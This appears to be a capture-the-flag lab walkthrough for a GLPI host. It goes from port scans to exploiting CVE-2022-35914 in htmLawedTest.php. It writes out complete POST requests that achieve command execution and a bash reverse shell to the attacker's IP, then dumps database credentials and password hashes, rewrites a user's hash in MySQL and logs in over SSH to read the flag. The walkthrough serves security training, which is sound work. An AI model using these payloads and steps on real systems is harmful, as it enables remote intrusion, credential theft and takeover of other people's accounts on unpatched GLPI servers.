@@ -1,0 +1,137 @@
+																							    GLPI Walkthrough
+																										
+Attacker's Machine: 192.168.49.68
+Victim's Machine: 192.168.68.242
+export IP=192.168.68.242
+	
+1. nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+2. nmap -Pn -n -sC -sV -p22,80 $IP --open --stats-every=5s -oN results.txt
+
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Authentication - GLPI
+Service Info: OS: Linux;
+
+3. nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000 
+ <!-- nothing -->
+ 
+
+Vulnerability Assessment
+
+nmap -n $IP -p 80 -sV --script vuln --stats-every=5s 
+http-enum: 
+/phpinfo.php: Possible information file
+/bin/
+/config/
+/css/
+/files/
+/inc/
+/install/
+/js/
+/lib/
+/pics/
+/public/
+/src/
+/templates/
+/vendor/
+
+nikto --url $IP 
+
+/bin/: Directory indexing found.
+
+DEBUG HTTP verb may show server debugging information
+
+
+Enumeration 
+
+wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 -t 30 "http://$IP/FUZZ"
+
+http://192.168.68.242/config/
+[   ]	config_db.php
+[   ]	glpicrypt.key
+
+
+
+https://github.com/cosad3s/CVE-2022-35914-poc   exploit RCE for GLPI using the function exec
+
+Verify the page http://192.168.68.242/phpinfo.php and check it the exec function has been disabled.      (it has :()
+
+We must find another way to exploit the vulnerability using the callback function. 
+
+Navigate to  http://192.168.68.242/vendor/htmlawed/htmlawed/htmLawedTest.php and notice that we have a an interesting functionality
+
+$C['hook']($t, $C, $S)
+• $t is the user entry : string
+• $C the config array : we can add whatever we want on the array
+• $S : the spec parameter can be a string or an array
+
+If we use array_map as a hook function this will run the callback function : $t, on each $C array value with the $S entry as params.
+text=<callback>&hhook=array_map&hexec=<my_entry>&sid=bs&spec[0]=&spec[1]=&spec[2]=... 
+
+• hhook=array_map : will launch array_map with the callback function on all the entries of $C.
+• text=call_user_func : call_user_func will be used as a callback function on every entries of $C (due to array map).
+• we add an entry on the config array with a parameter : hexec=system.
+• and next the corresponding config entry will be call with the corresponding spec array value.
+
+Use to following request to see if command execution is possible
+
+POST /vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1
+Host: 192.168.68.242
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+Connection: close
+Cookie: sid=bs
+
+text=call_user_func&hhook=array_map&hexec=system&sid=bs&spec[0]=&spec[1]=id      //  make sure you set both the cookie name and the sid parameter to have the same value
+
+
+Obtain shell.
+
+POST /vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1
+
+Host: 192.168.68.242
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 129
+Connection: close
+Cookie: sid=urs
+
+text=call_user_func&hhook=array_map&hexec=system&sid=urs&spec[0]=&spec[1]=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.68/80+0>%261'
+
+nc -lvnp 80
+
+Got Shell!!
+
+cd /var/www/glpi/config
+cat config_db.php
+
+public $dbuser = 'glpi';
+public $dbpassword = 'glpi_db_password';
+public $dbdefault = 'glpi';
+
+mysql -uglpi -pglpi_db_password
+
+ 2 | glpi        | $2y$10$9DbdMovtCw0eI.FWm18SRu34ErQD6LUzA8AqGUqiEat0S/ahlyHF
+ 3 | post-only   | $2y$10$dTMar1F3ef5X/H1IjX9gYOjQWBR1K4bERGf4/oTPxFtJE/c3vXILm
+ 4 | tech        | $2y$10$.xEgErizkp6Az0z.DHyoeOoenuh0RcsX4JapBk2JMD6VI17KtB1lO 
+ 5 | normal      | $2y$10$Z6doq4zVHkSPZFbPeXTCluN1Q/r0ryZ3ZsSJncJqkN3.8cRiN0NV.
+ 7 | betty       | $2y$10$jG8/feTYsguxsnBqRG6.judCDSNHY4it8SgBTAHig9pMkfmMl9CFa
+ 
+Since we know the user betty is already present on the machine, let's try to crack the password :D
+
+Aparently $2y$10$ is a PHP password hash. Tried rockyou.txt to decrypt it, no luck. I guess we have to replace the user's password with out own hash and then log in.
+
+update glpi_users set password='$2y$10$dHsoc1AGS7Jwrfs232r5WO9tLr0sDuQai6vm7NRNKk6IcWe/Va.1G' where id=7;
+
+Go back to the login page http://192.168.68.242/index.php and login using betty / pass.
+
+Navigate to the tickets selection and notice that a password change has been requested by betty. 
+
+New password: SnowboardSkateboardRoller234
+
+Login to ssh using the new credentials obtained for betty.
+
+ssh betty@$IP
+SnowboardSkateboardRoller234
+
+cat local.txt    // 8c4562d2d1df96617024e254496fe469
